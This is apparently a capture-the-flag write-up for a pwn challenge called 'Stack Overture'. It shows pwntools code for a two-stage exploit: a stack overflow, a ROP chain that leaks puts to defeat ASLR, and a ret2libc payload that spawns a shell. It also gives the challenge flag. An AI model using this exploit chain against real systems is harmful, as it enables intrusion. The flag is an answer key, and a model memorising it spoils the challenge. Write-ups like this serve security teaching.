---
title: Stack Overture
category: Pwn
points: 425
difficulty: 4
flag: HTB{r0p_y0ur_w4y_b4ck_h0m3}
solves: 312
tags: [pwn, rop, ret2libc]
author: Radiant Blaze
description: A classic stack smash with NX enabled. Leak libc, then build a short ret2libc chain to pop a shell.
---
## Triage

`checksec` tells the story before the disassembler does:

```sh
checksec --file=overture
# NX enabled | No canary found | PIE disabled
```

No canary and no PIE means a plain overflow to a fixed return address. NX only forbids executing the stack, so we return into existing code instead of shellcode.

## The Overflow

`read()` pulls `0x100` bytes into a `0x40` buffer. The offset to the saved return address is 72 bytes, found by sending a cyclic pattern and reading the crash offset:

```python
offset = 72
```

## Stage 1 — Leak

There is no `system` call in the binary, so we defeat ASLR by leaking a real libc address with `puts`, then returning to `main` to go again:

```python
rop = ROP(elf)
payload  = b"A" * offset
payload += p64(rop.rdi.address) + p64(elf.got["puts"])
payload += p64(elf.plt["puts"]) + p64(elf.symbols["main"])
```

Subtract the known `puts` offset from the leak to rebase libc.

> One leak plus a return to `main` is the whole game: the first shot buys the addresses, the second cashes them in.

## Stage 2 — Shell

Second payload calls `system("/bin/sh")` with the now-known libc base:

```python
payload  = b"A" * offset
payload += p64(rop.ret.address)          # 16-byte stack alignment
payload += p64(rdi) + p64(binsh)
payload += p64(libc.symbols["system"])
```

A shell drops and `cat flag.txt` finishes it.

## Flag

```
HTB{r0p_y0ur_w4y_b4ck_h0m3}
```
